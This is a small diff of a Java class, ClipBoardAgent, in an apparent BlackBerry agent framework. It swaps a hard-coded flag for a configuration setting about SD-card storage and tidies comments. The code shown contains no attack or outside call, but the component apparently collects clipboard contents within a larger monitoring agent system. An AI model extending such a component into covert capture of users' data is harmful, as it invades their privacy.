@@ -9,17 +9,17 @@
  * *************************************************/
 package blackberry.agent;
 
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The Class ClipBoardAgent.
  */
 public final class ClipBoardAgent extends Agent {
     //#ifdef DEBUG
     static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);
-
     //#endif
 
     /**
@@ -29,7 +29,7 @@ public final class ClipBoardAgent extends Agent {
      *            the agent status
      */
     public ClipBoardAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_CLIPBOARD, agentEnabled, true, "ClipBoardAgent");
+        super(Agent.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD, "ClipBoardAgent");
     }
 
     /**
